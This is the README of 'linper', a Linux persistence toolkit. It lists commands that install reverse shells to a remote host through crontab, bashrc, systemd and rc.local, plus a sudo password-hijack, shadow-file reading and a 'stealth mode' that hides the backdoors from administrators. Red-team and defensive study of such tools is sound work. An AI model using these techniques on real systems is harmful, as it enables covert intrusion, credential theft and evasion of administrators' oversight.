# linper

linux persistence toolkit - enumerate, install, or remove persistence mechanisms

## files

- README.md - or not
- TODO.md - planned fixes & enhancements
- linper.sh - execute me
- gtfobins/ - directory containing (possibly modified) snippets of code from [gtfobins](https://gtfobins.github.io/) as I am working on integrating them into the overall script

## usage

### enumerating binaries for persistence

`bash linper.sh --dryrun`

`bash linper.sh -d`

### installing reverse shells

`bash linper.sh --rhost 10.10.10.10 --rport 4444`

`bash linper.sh -i 10.10.10.10 -p 4444`

#### stealth mode

`bash linper.sh --rhost 10.10.10.10 --rport 4444 --stealth-mode`

`bash linper.sh -i 10.10.10.10 -p 4444 -s`

### remove reverse shells to a given RHOST

`bash linper.sh --rhost 10.10.10.10 --clean`

`bash linper.sh -i 10.10.10.10 -c`

#### caveats

- This functionality is designed to remove reverse shells installed using this tool however since this tool uses common/well-known techniques, it may also be used to remove unwanted reverse shells if you know the C2 domain/IP
- The cleaning mechanism does not remove any bash aliases from the `-s,--stealth-mode` options (though that is being planned, see TODO.md)

## methodology

### installing

1. Enumerating methods and doors - the script enumerates binaries that can be used for executing a reverse shell (methods, e.g. bash), and then for each of those, it enumerates ways to make them persist (doors, e.g. crontab). If dryrun is not set, every possible method and door pair is set

2. Sudo hijack attack - Enumerates whether or not the current user can sudo, if so, and if dryrun not set, it installs a function in their bashrc to "hijack that binary". Thanks to [this Null Byte article](https://null-byte.wonderhowto.com/how-to/steal-ubuntu-macos-sudo-passwords-without-any-cracking-0194190/) for the idea.

3. Web Server Poison Attack - Enumerates whether or not the webserver's directories are writable (this feature will be expanded, see TODO.md)

4. Shadow file enumeration - Enumerates whether or not the shadow file is readable, if dryrun is not set then it will grep for non-system accounts

#### stealth mode

`-s, --stealth-mode various trivial modifications in an attempt to hide the backdoors from humans`

1. Makes the files related to installing services hidden by prepending a "."

2. Disables the ability to append methods to the bashrc - because if a connection fails it is noisy and prints to the screen

3. Creates a `crontab` function in \~/.bash\_aliases to override the `-r` and `-l` flags. `-r` is changed to remove all crontab entries <u>except</u> your reverse shells. `-l` is changed to list all the existing cron jobs <u>except</u> your reverse shells.

##### caveat

1. If you run `-s, --stealth-mode` as a sudo enabled user, be aware that you can bypass the `crontab` function installed in \~/.bash\_aliases because aliases are not preserved when running `sudo`, nor does `sudo` call the `root` user aliases. (This does not interfere with the sudo hijack attack)
### cleaning

1. To remove shells from the bashrc (current user's and /etc/skel), it simply greps out any lines with the given RHOST and creates a temp file which is then used to replace the respective file

2. To remove shells from crontab, it attempts to grep out any lines with the given RHOST from `crontab -l` and pipes that to crontab. If the install fails, it assumes there are no other cron jobs so it runs `crontab -r`

3. To remove reverse shells from systemctl service tactics, it looks for the shell script with the given RHOST in it and then looks for the name of said file in a .service file and removes both. This particular method of cleaning may only be useful of cleaning reverse shells installed by this program becuase it is based on the specific way this program utilizes systemctl to install backdoors

4. To remove shells from /etc/rc.local, it simply greps out any reference to the given RHOST and if the remaining file is two lines long it assumes there was nothing else to execute in rc.local so it removes the file (it checks for two lines because, at minimum, it must start with "!#/bin/sh -e" and end with "exit 0")
